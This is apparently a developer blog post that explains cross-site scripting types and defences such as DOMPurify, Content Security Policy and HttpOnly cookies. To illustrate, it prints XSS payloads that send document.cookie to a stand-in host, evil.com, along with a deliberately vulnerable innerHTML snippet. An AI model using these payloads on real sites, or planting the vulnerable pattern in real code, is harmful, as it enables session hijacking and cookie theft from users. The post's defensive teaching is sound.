---
title: "🪄 XSS: The Attack Hiding Inside Your innerHTML"
date: "2026-04-25"
excerpt: "Cross-Site Scripting has been killing web apps since the 90s. It's embarrassingly simple, wildly misunderstood, and your React app probably isn't as safe as you think. Let's fix that."
tags: ["security", "xss", "web-security", "owasp", "javascript", "cybersecurity", "frontend"]
featured: true
---

# 🪄 XSS: The Attack Hiding Inside Your innerHTML

Here's a fun game: open your browser DevTools right now, paste `document.cookie` into the console, and hit Enter.

Yep — that's your session data. Your auth tokens. Maybe your saved form fields. Just sitting there, readable by any JavaScript on the page.

Now here's the terrifying part: **Cross-Site Scripting (XSS)** lets *attackers* run that same JavaScript in *your users' browsers*. They don't need server access. They don't need to break your database. They just need to sneak a `<script>` tag past your defenses, and suddenly they're reading cookies, hijacking sessions, and redirecting users to phishing pages — all while your app happily displays "Welcome back, user!"

XSS has been in the OWASP Top 10 since the list was invented. It's responsible for the 2005 Samy worm (which infected a million MySpace profiles in 20 hours), the British Airways breach, and roughly 40% of all bug bounty reports filed today. And yet — developers keep shipping it.

Let's understand why, and how to stop it.

## What XSS Actually Is (Not What You Think) 🤔

Most devs hear "XSS" and picture this:

```html
<!-- User submits this as their username -->
<script>alert('hacked')</script>
```

And yeah, that works — on sites from 2003. Modern browsers and frameworks block the obvious stuff. The real danger is subtler.

XSS happens when **untrusted data is rendered as executable code** in a browser. That "untrusted data" can be:

- A URL parameter (`?search=<img onerror=...>`)
- A database value inserted into a template
- A JSON response dropped directly into the DOM
- A third-party npm package you installed six months ago

The `<script>` tag is actually one of the *harder* ways to do XSS. Here's a nasty payload that bypasses most naive filters:

```html
<!-- No <script> tag needed -->
<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">

<!-- Or via a perfectly innocent-looking attribute -->
<a href="javascript:document.location='https://evil.com/steal?c='+document.cookie">
  Click here for your free prize!
</a>
```

That `onerror` fires the moment the browser tries (and fails) to load the image. Silent. Invisible. Deadly.

## The Three Flavors of XSS 🍦

**Stored XSS** — The payload is saved in your database and served to every user who views that page. A malicious username, a comment, a product description. One injection, unlimited victims. This is how the Samy worm worked.

**Reflected XSS** — The payload lives in a URL and bounces off the server into the response. Classic phishing vector: attacker sends a link, victim clicks it, evil script runs. Your server is just the unwitting accomplice.

**DOM-based XSS** — The scariest one. The server is completely innocent. The attack happens entirely in client-side JavaScript when your code reads from `location.hash`, `document.URL`, or `window.name` and writes it directly to the DOM. Your backend logs show nothing unusual because the attack never touched the server.

```javascript
// This code is a DOM XSS waiting to happen
const search = new URLSearchParams(window.location.search).get('q');
document.getElementById('results-title').innerHTML = `Results for: ${search}`;

// Attacker sends: ?q=<img src=x onerror=alert(document.cookie)>
// Your "harmless" innerHTML renders it. Game over.
```

## "But I Use React!" (You're Not Safe) ⚛️

React's JSX escapes output by default. That's true, and it's great. But it has an escape hatch with a name that should give you nightmares: `dangerouslySetInnerHTML`.

```jsx
// This is React's way of saying "I warned you"
function BlogPost({ content }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} />
  );
}
```

If `content` comes from a database, an API, or a markdown renderer that isn't configured carefully — you've got stored XSS. I've seen this exact pattern in production at companies that thought "we use React, we're fine."

The fix? Use a proper sanitization library *before* you hand anything to `dangerouslySetInnerHTML`:

```javascript
import DOMPurify from 'dompurify';

function BlogPost({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

DOMPurify strips anything that could execute JavaScript while keeping your legitimate HTML. Allowlist your tags and attributes — don't use a blocklist, because attackers are more creative than your blocklist.

## The Defense Playbook 🛡️

**1. Never trust input, escape output.** This is the cardinal rule. Every piece of user-supplied data that gets rendered should be escaped for the context it's rendered in — HTML context, attribute context, JavaScript context, and URL context all need different escaping. Your templating engine should do this automatically; if you're manually building HTML strings, you're doing it wrong.

**2. Set a Content Security Policy (CSP).** CSP is a response header that tells the browser which scripts are allowed to run. A strict CSP is the best defense-in-depth layer you can add:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none';
```

Even if an attacker injects a `<script>` tag, CSP tells the browser to refuse to run it unless it has the right nonce. It breaks XSS at the execution layer, not just the injection layer.

**3. Use `HttpOnly` cookies for session tokens.** `document.cookie` can't read `HttpOnly` cookies. This doesn't prevent XSS, but it makes the most common goal — session hijacking — much harder. Pair with `Secure` and `SameSite=Strict` while you're at it.

**4. Audit your dependencies.** Third-party scripts (analytics, chat widgets, ad networks) run with full page privileges. One compromised package in your supply chain and every user on every page gets hit — no injection required on your end. This is called a **supply chain XSS**, and it took down British Airways.

## The Bottom Line 🎯

XSS is not a "beginner mistake" or a "legacy problem." It's an active threat in modern JavaScript apps, and it's specifically hunting for the places where you got lazy — the `innerHTML` you didn't sanitize, the URL param you dropped straight into the DOM, the markdown renderer you configured with defaults.

The good news: the defenses are straightforward. Escape your output. Add a CSP header. Use `HttpOnly` cookies. Sanitize before `dangerouslySetInnerHTML`. Audit your dependencies.

Bad security doesn't come from ignorance of exotic attacks. It comes from skipping the boring fundamentals. Don't skip the boring fundamentals.

---

**Found this useful?** Share it with a dev friend who's written `innerHTML` without flinching. Or come argue with me about CSP nonces on [GitHub](https://github.com/kpanuragh) — I'm always happy to be wrong in public.
